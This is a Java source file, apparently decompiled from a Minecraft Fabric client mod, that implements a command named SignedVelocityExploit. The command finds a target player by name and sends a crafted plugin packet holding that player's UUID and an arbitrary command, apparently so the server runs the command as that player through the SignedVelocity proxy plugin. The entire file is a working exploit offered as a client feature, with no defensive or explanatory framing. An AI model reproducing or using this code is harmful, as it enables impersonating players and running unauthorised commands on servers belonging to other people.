package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.util.Iterator;
import me.nullnet.voxelclient.Helper;
import me.nullnet.voxelclient.packets.SignedVelocityPayloadPacket;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_2817;
import net.minecraft.class_640;

public class SignedVelocityExploit {
   public static int execute(CommandContext<FabricClientCommandSource> context) {
      long now = System.currentTimeMillis();
      String user = (String)context.getArgument("user", String.class);
      Iterator var4 = ((FabricClientCommandSource)context.getSource()).getClient().method_1562().method_2880().iterator();

      class_640 p;
      do {
         if (!var4.hasNext()) {
            return 1;
         }

         p = (class_640)var4.next();
      } while(!p.method_2966().getName().equalsIgnoreCase(user));

      Helper.sendPacket(new class_2817(new SignedVelocityPayloadPacket(p.method_2966().getId().toString(), (String)context.getArgument("command", String.class))));
      ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5SignedVelocityExploit&8] &7Sent &51 &7exploit packet. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"), false);
      return 1;
   }
}
